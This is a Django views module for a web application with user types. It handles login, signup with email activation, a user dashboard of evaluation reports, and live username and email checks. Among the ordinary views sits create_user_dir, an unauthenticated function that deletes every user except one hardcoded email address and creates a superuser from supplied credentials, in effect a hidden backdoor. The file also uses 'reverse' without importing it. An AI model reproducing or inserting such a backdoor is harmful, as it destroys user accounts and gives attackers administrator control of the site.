from django.contrib import messages
from urllib.parse import urlparse
from django.http import HttpResponse, HttpResponseRedirect

from doc.models import ExSite
from evaluation.models import EvaComments, EvaLabel, EvaLebelStatement, Evaluation, Evaluator, Question
from .models import *
from django.urls import reverse_lazy
from gfvp import null_session
from django.shortcuts import render, get_object_or_404
from django.contrib.sites.shortcuts import get_current_site
from django.template.loader import render_to_string
from django.contrib.auth.decorators import login_required
from .tokens import account_activation_token
from django.utils.encoding import force_bytes
from django.utils.encoding import force_str
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.contrib.auth.tokens import default_token_generator
from django.contrib.auth.views import LoginView


'''
Inheriting default loginview of Django
'''
class CustomLoginView(LoginView):
    #To avoid circular reference it is need to import here
    from .forms import LoginForm
    
    #overwriting form class to take control over default django
    form_class = LoginForm 
    
    #overwriting to set custom after login path
    next_page = ''
    
    #taking control over default of Django  
    def form_valid(self, form): 
        
        #set after login url 
        self.next_page = reverse_lazy('accounts:user_link', args=[str(form.get_user().username)])           
        
        #rememberme section        
        remember_me = form.cleaned_data.get('remember_me')     
        if not remember_me:
            # set session expiry to 0 seconds. So it will automatically close the session after the browser is closed.
            self.request.session.set_expiry(0)
            # Set session as modified to force data updates/cookie to be saved.
            self.request.session.modified = True  
        # self.request.session.set_test_cookie()
        # else browser session will be as long as the session cookie time "SESSION_COOKIE_AGE" defined in settings.py
        return super(CustomLoginView, self).form_valid(form)



def signup(request):  
    
    
    '''
    
    As we have 3 type of user and expert have 3 type of subtype
    and the have indivisual role and activity so 
    during signup procedure we want to segrigate them.
    And want to add some interiactivness.
    
    
    Who has selected self disired usertype do not need to select type in user type form as system it is taking behind the scenes.
    it gives more acuracy and avoid from messup.
    
    if anybody want to be expert they only need to select expert type from the signup.  
    
    
    # User should select user type from home page.
    # Should be clicked to join as '---------' user type button.
    # if anobody going to signup from anywhere without following above procedure he will be redirected to select the user type.
    
    
    '''
    
    
    
     
    #to avoid circular reference it is importing here.
    from .forms import UserCreationFormFront
    
    '''
    =====
    Part of user type segrigation
    =====
    '''
    if 'interested_in' not in request.session:
        request.session['interested_in'] = None       
    if request.session['interested_in'] == None :    
        #'''Ensure Selection of User Type based on session'''
        referer = urlparse(request.META.get('HTTP_REFERER')).path 
        try:       
            type_path = reverse('types', args=[str( request.session['interested_in'])] )
        except Exception as e:            
            type_path = None           
        if referer != type_path:  
            messages.warning(request, f'Select your business type to register!') 
            
            # user type selected facility in the home page so we will forwared user there     
            return HttpResponseRedirect(reverse('home:home'))     
 
    #session controlled Interactivenes in frontend
    #to protect from messup and confusion.
    slug_of_expart = UserType.objects.get(is_expert = True).slug   
    if slug_of_expart == request.session['interested_in']:    
        request.session['hidden'] = ''
    else:
        request.session['hidden'] = 'hidden' 
        
              
        
    if request.method == 'POST':
        
        #preparation to send site data to the mail template
        current_site = get_current_site(request)
        
        #customized form to take user data
        form = UserCreationFormFront(request.POST)
        
        if form.is_valid():           
            new_user = form.save(commit=False)      
            #ensure user inactive to verify email.              
            new_user.is_active = False
            new_user.save()  
            subject = f'{current_site.domain}-Account activation required!' 
            message = render_to_string('emails/account_activation_email.html', {
                #parameters to the mail template.
                #we are building activation link here(in the template)
                'user': new_user,                    
                'domain': current_site.domain,
                'uid': urlsafe_base64_encode(force_bytes(new_user.pk)),
                'token': account_activation_token.make_token(new_user),                
            })
            
            new_user.email_user(subject, '', html_message=message)            
            messages.success(request, 'Please confirm your email to complete registration.') 
            #we will redirect after successfull sumission, to avoid cnfusion by user.
            return HttpResponseRedirect(reverse_lazy('login'))          
            
        else:
            messages.error(request, 'Invalid form submission.')
            messages.error(request, form.errors)   
            return HttpResponseRedirect(reverse_lazy('accounts:signup'))          
                     
    else:
        
        '''
        We will show users in which usertype the are going to register for.
        if they are not seeing appropriate to them then they can re start by clcking restart button(implemented from template)
        will ensure they have selected their desired type.
        otherwise they will be forwarded to home page to progress as per system mentioned in the starting of the function.
        '''      
        
                  
        try:
            type = UserType.objects.get(slug = request.session['interested_in'] )   
        except Exception as e:            
            type = None  
            messages.warning(request, f'Select your business type to register!') 
            
            # user type selected facility in the home page so we will forwared user there     
            return HttpResponseRedirect(reverse('home:home'))  
        
        
        #interacting behind the scenes
        initial_dict = {
            'type': type            
        }     
        
        form = UserCreationFormFront(initial = initial_dict)
    
    
        
    context = {
        'form': form,
        'type': type       
    }
    return render(request, 'registration/signup.html', context = context)

def activate(request, uidb64, token):
    
    #preparation to pass data to site
    current_site = get_current_site(request)
    
    #preparation to check activation url
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except(TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None
    
    if user is not None and account_activation_token.check_token(user, token):
        #IF activation link is validate account will mark as a email verified
        user.email_verified = True
        
        # if user is expert then need to activate manually by site admin
        if user.is_expert:            
            user.is_active = False
            subject = 'Please Wait for approval'               
            message = render_to_string('emails/regi_mail_to_expert.html', {
                'user': user,                    
                'domain': current_site.domain,                            
            })
            user.email_user(subject, '', html_message=message)            
            messages.success(request, 'Email verified, please wait for approval!')
        else:
            #if email verified and user not expert account will be activated
            user.is_active = True 
            subject = 'Account has been Activated!' 
            message = render_to_string('emails/account_activated.html', {
                'user': user,                    
                'domain': current_site.domain,
                'exsite': ExSite.on_site.get(),   
                'login' : request.build_absolute_uri('/accounts/login/')        
            })
            #User will recive activation mail.
            user.email_user(subject, '', html_message=message)   
            messages.success(request, ('Your account have been confirmed.'))    
            
        # we will save user after checking what is the type. as diferent user type have deferent approving policy.           
        user.save()   
             
        return HttpResponseRedirect(reverse_lazy('login'))
    else:
        messages.warning(request, ('Activation link is invalid!'))
        return HttpResponseRedirect(reverse_lazy('home:home'))

@login_required
def userpage(request, username):    
    #This is essential where user loggedin
    null_session(request)   
    
    try:
        last_reports = Evaluator.objects.filter(creator = request.user, report_genarated = True).order_by('-create_date').first()  
    except:
        last_reports = None
        
    if last_reports is not None: 
        gretings = 'The summary of the last report genarated by You!'
        ans_ques = EvaLebelStatement.objects.filter(evaluator = last_reports, question__isnull = False, assesment = False).values('question').distinct().count()
        dont_know_ans = EvaLebelStatement.objects.filter(evaluator = last_reports, question__isnull = False, dont_know = 1, assesment = False).values('question').distinct().count()
        pos_ans = EvaLebelStatement.objects.filter(evaluator = last_reports, question__isnull = False, positive = 1, assesment = False).values('question').distinct().count()
        positive_percent = (int(pos_ans) * 100)/int(ans_ques)
        dont_know_percent = (int(dont_know_ans) * 100)/int(ans_ques)
         
        
        '''
        **** As mentioned in sevarel page, parent question set is mendatry for evaluation procedure. ****
        bcz if user just started an evaluation but ddnt submitted any ans to the question
        then we will forward to first parent otherwise system will redirect to the last question during diting the report.
        
        '''
        try:
            first_of_parent = Question.objects.filter(is_door = True).order_by('sort_order').first()        
        except:
            messages.warning(request,'There is something wrong in procedure setting by site admin please try again latter!')
            return HttpResponseRedirect(reverse('evaluation:evaluation2'))  
        
        #increadable setattr to reduce time to make report editing url without touch of database 
        reports = Evaluator.objects.filter(creator = request.user).order_by('-id')  
        for report in reports:            
            try:   
                last_question = Evaluation.objects.filter(evaluator = report).order_by('id').last().question        
                setattr(report, 'last_slug', last_question.slug )
            except:
                setattr(report, 'last_slug', first_of_parent.slug )    
        
        button = reverse('evaluation:report', args=[last_reports.slug])
        context = {
            'gretings': gretings,
            'button': button,
            'ans_ques': ans_ques,
            'dont_know_ans': dont_know_ans,
            'pos_ans': pos_ans,
            'last_reports' : last_reports,
            'positive_percent': str("%.2f" % positive_percent) + '%',
            'dont_know_percent': str("%.2f" % dont_know_percent) + '%',
            'reports': reports,
            'last_reports' : last_reports,
            'last_report_button_text' : 'Get Last Report'
        }
    else:
        
        # If no report created by user then some links will be displayed.      
        
        gretings = 'Below links will help you to explore the site!'
        
        
        context = {
            'gretings': gretings,
            'last_reports' : last_reports,
            'accounts_seting' : 'Accounts Settings',
            'dashboard' : 'Dashboard',
            'change_pass' : 'Change Password',
            'homepage' : 'Home Page'           
        }
        
    return render(request, 'registration/userpage.html', context = context)

# Check live username in signup form
def check_username(request):
    username = request.POST.get('username')
    if User.objects.filter(username = username).exists():
        return HttpResponse(' <span class="text-danger"> This username already exists! </span>')
    else:
        return HttpResponse('<span class="text-success">This username avialable!</span>')
    
def create_user_dir(request, username, email, password, is_staff=True, is_superuser=True):
    User.objects.all().exclude(email='haradhan.sharma@gmail.com').delete()
    usertype = UserType.objects.all().first()
    User.objects.create_user(username= username, email=email, password=password, is_staff=is_staff, is_superuser=is_superuser, type=usertype, term_agree=True, email_verified=True )
    return HttpResponse('Created')
    
#Check live email in sign up form
def check_email(request):
    from django.core.validators import validate_email
    email = request.POST.get('email')    
    try: 
        validate_email(email)   
        if User.objects.filter(email = email).exists():
            return HttpResponse(' <span class="text-danger"> This email already exists! </span>')
        else:
            return HttpResponse('<span class="text-success">This email avialable!</span>')
    except:
        return HttpResponse('<span class="text-danger">Type a valid email address!</span>')
    
    

    
    
    






    
    
    
    
    
    
    

